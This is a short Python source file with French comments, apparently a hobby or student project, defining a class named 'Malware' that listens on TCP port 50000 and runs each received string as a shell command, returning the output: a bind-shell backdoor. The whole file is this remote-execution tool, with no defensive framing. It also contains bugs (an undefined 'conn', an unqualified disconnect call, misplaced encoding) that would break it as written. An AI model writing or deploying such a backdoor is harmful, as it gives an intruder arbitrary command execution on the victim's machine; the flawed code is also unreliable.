import socket, subprocess as sp, threading, sys

ENCODING = 'UTF-8'

#PLAY ROLE OF THE SERVER

class Malware():

    DEFAULT_PORT = 50000
    DEFAULT_HOST = "localhost" # A MODIFIER SELON LA THEORIE OU ON A UNE IP STATIQUE

    def __init__(self):
        self.server_socket = socket.socket()
        self.server_socket.bind((self.DEFAULT_HOST, self.DEFAULT_PORT))
        print("En Attente du client...")#DEBUG A SUPPRIMER
        self.server_socket.listen(1)
        self.conn, self.addr = self.server_socket.accept()

    def disconnect(self):
        conn.close()

    def receiveCmd(self):

        client_ip = self.addr[0]
        print("IP du client : ",client_ip)

        while True:
            command = str(conn.recv(1024).decode(ENCODING))
            if command != "exit()":
                sh = sp.Popen(command, shell=True,
                                stdout = sp.PIPE,
                                stderr = sp.PIPE,
                                stdin = sp.PIPE,
                              universal_newlines=True
                              )

                out, err = sh.communicate()
                print (sh.communicate())
                print (out, err) # Pour test
                result = str(out) + str(err)
                length = str(len(result)).zfill(16)
                conn.send(length+result).encode(ENCODING)

            else:
                disconnect()

asperge = Malware()
asperge.receiveCmd()
